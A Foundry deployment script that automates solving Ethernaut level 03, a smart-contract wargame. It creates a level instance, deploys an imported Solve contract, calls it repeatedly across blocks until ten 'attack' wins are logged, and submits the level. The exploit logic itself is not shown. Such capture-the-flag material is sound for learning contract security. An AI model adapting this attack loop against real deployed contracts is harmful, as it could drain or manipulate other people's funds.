// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import "../src/Solve.sol";
import {Script, console} from "@forge-std/Script.sol";
import {Vm} from "@forge-std/Vm.sol";

interface IEthernaut {
    function createLevelInstance(address) external payable;
    function submitLevelInstance(address) external;
}

contract Deploy is Script {
    uint256 playerPk = vm.envUint("USER_PRIVATE_KEY");
    address player = vm.addr(playerPk);
    address ethernaut = vm.envAddress("ETHERNAUT_ADDRESS");
    address level = vm.envAddress("ETHERNAUT_LEVEL_03");
    address target;
    bool result;

    function createInstance(uint256 _playerPk, address _level) public {
        vm.recordLogs();
        vm.startBroadcast(_playerPk);

        IEthernaut(ethernaut).createLevelInstance(_level);

        vm.stopBroadcast();

        Vm.Log[] memory logs = vm.getRecordedLogs();

        for (uint i = 0; i < logs.length; i++) {
            if (logs[i].topics.length >= 3) {
                target = address(uint160(uint256(logs[i].topics[2])));
        
                console.log("Player:", player);
                console.log("Instance:", target);
        
                break;
            }
        }
    }

    function submitInstance(uint256 _playerPk, address _level) public returns (bool){
        bytes32 successSig = keccak256("LevelCompletedLog(address,address,address)");
        
        vm.recordLogs();
        vm.startBroadcast(_playerPk);

        IEthernaut(ethernaut).submitLevelInstance(_level);

        vm.stopBroadcast();
        
        Vm.Log[] memory logs = vm.getRecordedLogs();

        for (uint i = 0; i < logs.length; i++) {
            if (logs[i].topics[0] == successSig) {
                return true;
            }
        }

        return false;
    }

    function run() external {
        // 0. Create Level Instance
        createInstance(playerPk, level);

        vm.broadcast(playerPk);
        Solve solve = new Solve(target);

        // 1. call function solve 10 times to exploit
        uint256 successCount = 0;
        uint256 maxAttempts = 50; // 무한루프 방지
        uint256 attempts = 0;

        while (successCount < 10 && attempts < maxAttempts) {
            attempts++;
            console.log("Attempt:", attempts, "Success:", successCount);

            vm.startBroadcast(playerPk);

            try solve.solve() {
                successCount++;
                console.log("Attack succeeded! Total wins:", successCount);
            } catch {
                console.log("Same block, skipping...");
            }

            vm.stopBroadcast();

            if (successCount < 10) {
                console.log("Waiting 15s for next block...");
                vm.sleep(15000);
            }
        }
        
        // 2. Submit Level Instance
        result = submitInstance(playerPk, target);

        if (result) {
            console.log(string(abi.encodePacked("Level completed!")));
        } else {
            revert(string(abi.encodePacked("Level failed...")));
        }
    }
}